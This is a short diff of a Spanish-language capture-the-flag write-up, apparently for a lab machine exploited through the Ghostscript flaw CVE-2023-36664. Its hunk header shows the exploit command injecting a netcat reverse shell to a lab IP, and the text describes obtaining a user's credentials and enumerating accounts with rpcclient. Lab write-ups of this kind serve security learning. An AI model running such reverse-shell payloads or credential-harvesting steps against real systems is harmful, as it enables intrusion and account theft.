@@ -203,3 +203,6 @@ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.81 4444 -e
 una ves estamos dentro de la maquina podemos ejecutar el script `ghostscript.bat` para obtener las credenciales de `drbrown` 
 ![[Pasted image 20240413005446.png]]
 
+### rpcclient
+utilizando las credenciales de `drbronw` podemos enumerar y ver que la información del usuario administrator se esta compartienndo
+![[Pasted image 20240413005848.png]]
